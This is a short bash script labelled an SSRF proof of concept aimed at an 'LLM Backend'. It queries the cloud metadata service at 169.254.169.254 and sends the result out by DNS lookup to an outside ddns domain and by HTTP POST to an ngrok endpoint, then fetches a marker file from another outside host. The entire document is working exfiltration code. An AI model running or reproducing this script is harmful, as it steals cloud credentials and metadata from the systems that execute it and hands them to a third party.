#!/bin/bash
echo "=== SSRF PoC HIT == $(date) == LLM Backend =="

# Blind DNS SSRF (MOST Reliable)
SSRF_DATA=$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "metadata-blocked")
nslookup "${SSRF_DATA// /.}".1003afc4aa.ddns.1433.eu.org.

# HTTP Exfil to your ngrok
curl -s "http://localhost/admin" \
  -X POST \
  -d "{\"ssrf\":\"$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null)\"}" \
  https://favourless-hattie-amphibians.ngrok-free.dev/log

# Echo proof
curl -s https://norosec.xyz/ssrf-echo.txt
echo "SSRF EXECUTED SUCCESSFULLY"
